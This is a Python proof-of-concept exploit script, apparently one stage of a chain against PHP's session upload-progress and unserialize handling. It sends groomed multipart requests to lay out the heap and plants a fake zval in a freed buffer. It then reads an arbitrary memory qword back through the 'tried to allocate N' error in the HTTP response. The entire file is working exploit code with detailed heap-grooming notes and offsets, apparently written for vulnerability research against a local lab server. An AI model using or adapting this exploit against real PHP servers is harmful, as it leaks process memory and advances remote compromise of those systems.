#!/usr/bin/env python3
"""a3_groom_v2.py - filler-class marching groom + the N-oracle read.

Placement physics (the cb4 fix):
- the freed d run (3 pages, page ~105/106 of the main chunk) comes back
  into service when the chunk leaves the heap cache; first-fit serves
  allocations from the LOWEST fitting free run.
- FILLERS with 2-page-class values (5000B): their $_POST copies march
  2 pages each; their freed read_body holes (2 pages) are TOO SMALL for
  the groom's 3-page request -> the groom skips them.
- GROOM value = 8193B (3-page class): its read_body takes the first
  >=3-page free run = the top of the march -> lands at page ~2K+2.
  K = (page_of_d - 2) / 2-ish; the N-oracle self-verifies the landing.
- The groom's read_body is freed after registration but its BYTES STAY
  until the FILE_START decode (freed != erased) -> the stale walk reads
  our fake-d.

N-oracle: fake zval {value=TARGET-0x10, type=0x106} -> the update encode
appends *(TARGET) bytes -> OOM -> "tried to allocate N" IN THE RESPONSE
with N = *(TARGET). TARGET = basic_globals+0x350 (BG(unserialize).data =
the stale d pointer, known via the assisted leak) -> N == d proves the
arbitrary-qword remote read end-to-end.
"""
import base64
import os
import re
import struct
import sys
import time
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import os
from a2_leak_collect import cexec, helper_scan, stage_session_file  # noqa
from a2_groom_roundtrip import fire  # noqa

HOST, PORT = "127.0.0.1", 8099
B = b"WPFIRE"
BG_UNSER_DATA_OFF = 0xF4C020 + 0x350
BIG = 75000000
FILLER = 5000        # 2-page class
GROOM_LEN = 8193      # 3-page class

def mp_parts(sid, fillers_n, groom):
    parts = [b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n' + sid.encode() + b"\r\n" +
             b"--" + B + b"\r\n" +
             b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n']
    for k in range(fillers_n):
        parts.append(b"--" + B + b"\r\n" +
                     b'Content-Disposition: form-data; name="f%d"\r\n' % k +
                     b"Content-Type: text/plain\r\n\r\n" +
                     (b"F%d" % k) + b"x" * (FILLER - 3) + b"\r\n")
    if groom is not None:
        parts.append(b"--" + B + b"\r\n" +
                     b'Content-Disposition: form-data; name="gr"\r\n' +
                     b"Content-Type: text/plain\r\n\r\n" + groom + b"\r\n")
    parts.append(b"--" + B + b"\r\n" +
                 b'Content-Disposition: form-data; name="u"; filename="a.txt"\r\n'
                 b"Content-Type: text/plain\r\n\r\nx\r\n" +
                 b"--" + B + b"--\r\n")
    body = b"".join(parts)
    head = (f"POST / HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n"
            f"Content-Type: multipart/form-data; boundary={B.decode()}\r\n"
            f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
            ).encode()
    return head + body

def build_groom(d, target):
    g = bytearray(GROOM_LEN)
    q = lambda off, v: struct.pack_into("<Q", g, off, v)
    dw = lambda off, v: struct.pack_into("<I", g, off, v)
    q(0x00, d + 0x38)       # last -> embedded entries (in-groom)
    q(0x08, 0); q(0x10, 0); q(0x18, 0); q(0x20, 0); q(0x28, 0)
    q(0x30, 0x1000)         # max_depth
    dw(0x38, 1)             # entries.used_slots = 1
    q(0x40, 0)              # entries.next
    q(0x48, d + 0x100)      # data[0] -> the oracle zval
    q(0x100, target - 0x10)  # zval.value: len will be read at TARGET
    dw(0x108, 0x106)        # IS_STRING | refcounted
    dw(0x10C, 0)
    return bytes(g)

def stage_consumer(sid, tok=b"k|a:1:{i:0;R:1;}"):
    t64 = base64.b64encode(tok).decode()
    rc, _ = cexec(f"echo {t64} | base64 -d > /tmp/sess_{sid}; "
                  f"chown www-data:www-data /tmp/sess_{sid}; chmod 600 /tmp/sess_{sid}")
    return rc == 0

def stale_hit():
    kids = helper_scan()
    return next((k for k in kids if k["data"] not in (0, None)
                 and k["pid"] != "1" and k["level"] not in (0, None)), None)

def main():
    # poison the pool
    for i in range(3):
        sidA = "wp2yA" + uuid.uuid4().hex[:24]
        assert stage_session_file(sidA)
        fire(mp_parts(sidA, 0, None))
    hit = stale_hit()
    if not hit:
        print("[-] no stale child after 3 producers")
        return 1
    d, bias = hit["data"], hit["bias"]
    page_d = (d & 0x1FFFFF) >> 12
    target = bias + BG_UNSER_DATA_OFF
    expected = d
    print(f"[+] stale pool ok: d=0x{d:x} (page {page_d}) bias=0x{bias:x}")
    print(f"[*] oracle TARGET=basic_globals+0x350, expected N={expected} (0x{expected:x})")
    k_guess = max(0, (page_d - 2) // 2)
    print(f"[*] filler-march K guess: {k_guess} (page ~{2*k_guess+2})")

    for k in range(max(0, k_guess - 6), k_guess + 7):
        # ensure a stale child exists
        if not stale_hit():
            for i in range(2):
                sidA = "wp2zA" + uuid.uuid4().hex[:24]
                assert stage_session_file(sidA)
                fire(mp_parts(sidA, 0, None))
            if not stale_hit():
                print(f"  [K={k}] repoison failed; abort")
                return 1
        groom = build_groom(d, target)
        results = []
        for attempt in range(3):
            sidB = "wp2zB" + uuid.uuid4().hex[:26]
            assert stage_consumer(sidB)
            resp = fire(mp_parts(sidB, k, groom))
            body = resp.partition(b"\r\n\r\n")[2]
            m = re.search(rb"tried to allocate (\d+)", body)
            if m:
                n = int(m.group(1))
                if n == expected:
                    results.append(f"*** N==d ORACLE READ (0x{n:x}) ***")
                elif n in (75000032, 434176, 2097152):
                    results.append(f"staged-N {n}")
                else:
                    results.append(f"FOREIGN-N {n} (0x{n:x})")
            elif len(resp) == 0 or resp == b"<RESET>":
                results.append("crash")
            elif b"Session has been destroyed" in body:
                results.append("clean-fail")
            else:
                results.append(f"normal({len(resp)})")
        win = any("ORACLE" in r for r in results)
        print(f"  [K={k}] {' | '.join(results)}{'   <<< LANDED >>>' if win else ''}", flush=True)
        if win:
            print("[+] GROOM LANDED + N-ORACLE READ THE TARGET QWORD FROM THE HTTP RESPONSE")
            return 0
    print("[-] sweep exhausted")
    return 1

if __name__ == "__main__":
    sys.exit(main())
